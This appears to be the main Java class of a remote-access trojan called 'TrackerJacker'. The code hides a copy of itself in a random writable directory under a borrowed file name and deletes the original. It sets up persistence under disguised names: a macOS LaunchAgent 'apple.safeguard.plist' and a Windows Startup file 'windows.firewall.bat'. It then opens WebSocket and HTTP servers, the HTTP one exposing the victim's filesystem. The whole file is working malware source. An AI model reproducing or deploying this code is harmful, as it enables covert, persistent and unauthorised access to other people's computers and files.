package track.er.ja.cker;

import static java.nio.file.StandardCopyOption.REPLACE_EXISTING;

import java.io.File;
import java.io.FileOutputStream;
import java.io.FilenameFilter;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.net.URISyntaxException;
import java.net.URLDecoder;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Random;

import org.apache.commons.io.IOUtils;
import org.eclipse.jetty.server.Handler;
import org.eclipse.jetty.server.Server;
import org.eclipse.jetty.server.handler.ContextHandler;
import org.eclipse.jetty.server.handler.ContextHandlerCollection;
import org.eclipse.jetty.server.handler.ResourceHandler;
import org.eclipse.jetty.util.resource.Resource;
import org.eclipse.jetty.websocket.server.WebSocketHandler;
import org.eclipse.jetty.websocket.servlet.WebSocketServletFactory;

public class TrackerJacker {
	
	public Random r = new Random();
	public static final  boolean DEBUG = false;
	public static final boolean TESTING = false;
	public String location = null;
	
	public File autoStart;
	
	public Thread websocketServer;
	public Thread httpServer;
	
	public static final String classPath = getCurrentFile();
	
	public static final String username = System.getProperty("user.name");
	public static final String user_dir = System.getProperty("user.dir");
	public static final String user_home = System.getProperty("user.home");
	
	public static final String java_home = System.getProperty("java.home");
	public static final String java_version = System.getProperty("java.version");
	
	public static final String OS = System.getProperty("os.name");
	public static final String OS_VERSION = System.getProperty("os.version");
	public static final String OS_ARCH = System.getProperty("os.arch");
	
	public File h_file = new File(new File(classPath).getParentFile().getAbsolutePath()+slash()+".hidden");
	
	
	public static void main(String[] args){
		new TrackerJacker();
	}
	
	public TrackerJacker(){
		
		boolean hidden = h_file.exists();
		
		if(!hidden && !TESTING){
			move();
		}else{
			h_file.deleteOnExit();
			/* Hidden */
			
			bootstrapNetwork();
		}
		
	}
	
	public static void debug(String s){
		if(DEBUG){System.out.println(s);}
	}
	
	public void onMessage(String s){
		
	}
	
	private void bootstrapNetwork(){
		/* Start Websocket Server */
		
		websocketServer = new Thread(){
			public void run(){
				
				debug("Init Websocket Server on port 4747");
				
				Server wsServer = new Server(4747);
				WebSocketHandler wsHandler = new WebSocketHandler() {
					@Override
					public void configure(WebSocketServletFactory factory) {
						factory.register(TrackerJackerWebSocketHandler.class);
					}
				};
				wsServer.setHandler(wsHandler);
				try {
					debug("Starting...");
					wsServer.start();
					wsServer.join();
				} catch (Exception e) {
					e.printStackTrace();
				}
				
			}
		};
		
		websocketServer.start();
		
		httpServer = new Thread(){
			public void run(){
				
				debug("Init HTTP Server on port 8080");
				
				/* Start HTTP Server */
				Server httpServer = new Server(8080);
				
				ContextHandler context = new ContextHandler("/");
				ResourceHandler resHandler = new ResourceHandler();
				resHandler.setBaseResource(Resource.newClassPathResource("/http/"));
				context.setHandler(resHandler);
				
				ContextHandler fsContext = new ContextHandler("/filesystem/");
				FileSystemHandler fsH = new FileSystemHandler();
				fsContext.setHandler(fsH);
				
				ContextHandlerCollection contexts = new ContextHandlerCollection();
		        contexts.setHandlers(new Handler[] { context, fsContext});
				
				httpServer.setHandler(contexts);
			    
				try {
					debug("Starting...");
					httpServer.start();
					httpServer.join();
				} catch (Exception e) {
					e.printStackTrace();
				}
				
			}
		};
		
		httpServer.start();
		
		debug("Setting up discovery listener...");
		
		DiscoveryThread discovery = new DiscoveryThread();
		discovery.run();
		
		debug("Networking set up!");
	}
	
	private void move(){
		
		String path = "";
		
		if(OSDetect.isWindows()){
			path = "C:\\";
		}else{
			path = "/";
		}
		
		String s = radnomizeDirectory(new File(path));
		location = s;
		debug("Using: " + s);
		
		try {
			Files.copy(Paths.get(classPath), Paths.get(s), REPLACE_EXISTING);
			
			new File(new File(s).getParentFile().getAbsolutePath()+slash()+".hidden").createNewFile();
			
			runFile(s);
			
			new File(classPath).deleteOnExit();
			System.exit(0);
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
	
	private void runFile(String path) throws IOException{
		if(OSDetect.isMac()){
			String[] cmd = {"bash", "-c", "java -Dapple.awt.UIElement=true -jar \"" + path +"\" "};
			Runtime.getRuntime().exec(cmd);
			
			autoStart=new File("/Users/"+username+"/Library/LaunchAgents/apple.safeguard.plist");
			
			if(autoStart.exists()){
				autoStart.delete();
			}
			
			String plist=new String(IOUtils.toByteArray(getClass().getResourceAsStream("/res/apple.safeguard.plist"))).replaceAll("###PATH###", path);
			FileOutputStream fos=new FileOutputStream(autoStart);
			fos.write(plist.getBytes());
			fos.flush();
			fos.close();
			
		}else if(OSDetect.isWindows()){
			Runtime.getRuntime().exec("javaw -jar \""+path+"\"");
			autoStart=new File("C:\\Users\\"+username+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\windows.firewall.bat");
			
			FileOutputStream fos=new FileOutputStream(autoStart);
			fos.write(("javaw -jar \""+path+"\"").getBytes());
			fos.flush();
			fos.close();
		}else{
			String[] cmd = {"bash", "-c", "java -jar \"" + path +"\" "};
			Runtime.getRuntime().exec(cmd);
		}
	}
	
	private String radnomizeDirectory(File folder){
		
		debug("Reading: "+folder.getAbsolutePath());
		
		if(folder.canRead()){
			/* Saves all indexes of already checked directories */
			ArrayList<Integer> checked = new ArrayList<Integer>();
			/* The directory that currently gets checked */
			Integer check = 0;
			/* The return value of the recursive function calls */
			String s = null;
			/* List all subdirectories */
			String[] directories = folder.list(new FilenameFilter() {
				@Override
				public boolean accept(File current, String name) {
					return new File(current, name).isDirectory();
				}
			});
			
			if(directories == null){return null;}
			
			debug(Arrays.toString(directories));
			debug("Subdirs: " + directories.length);
			
			if(directories.length > 0){
				/* If there are subdirectories, search them */
				while(checked.size() < directories.length){
					check = r.nextInt(directories.length);
					if(!checked.contains(check)){
						s = radnomizeDirectory(new File(folder.getAbsolutePath() + slash() + directories[check]));
						checked.add(check);
						
						if(s == null){
							/* If we haven't writing rights we continue */
							continue;
						}else{
							/* Else we return the obtained spot */
							return s;
						}
					}else{
						continue;
					}
				}
			}else{
				/* If not check if we have writing rights */
				if(folder.canWrite() && canWrite(folder) && folder.getName().equalsIgnoreCase("Desktop") == false){
					/* If yes, we copy us here */
					String name = folder.getName()+".jar";
					
					String[] files = folder.list(new FilenameFilter() {
						@Override
						public boolean accept(File current, String name) {
							return new File(current, name).isFile();
						}
					});
					
					if(files.length > 0){
						name = files[r.nextInt(files.length)]+".jar";
					}
					
					/* return our location */
					return folder.getAbsolutePath()+slash()+name;
				}else{
					/* If not, we return null */
					debug("No writing rights :(");
					return null;
				}
			}
		}
		
		return null;
	}
	
	public static String getCurrentFile(){
		try {
			String s = URLDecoder.decode(TrackerJacker.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath(), "UTF-8");
			if(OSDetect.isWindows()){
				if(s.charAt(0) == '/'){
					s = s.substring(1);
				}
			}
			debug("Current File Location: " + s);
			return s;
		} catch (URISyntaxException e) {
			e.printStackTrace();
		} catch (UnsupportedEncodingException e) {
			e.printStackTrace();
		}
		
		System.exit(0);
		
		return null;
	}
	
	public static boolean canWrite(File directory){
		String path = directory.getAbsolutePath()+slash()+"test.write";
		try {
			new File(path).createNewFile();
		} catch (IOException e) {
			return false;
		}
		new File(path).delete();
		return true;
	}
	
	public static final String slash(){
		return OSDetect.isWindows() ? "\\" : "/";
	}

}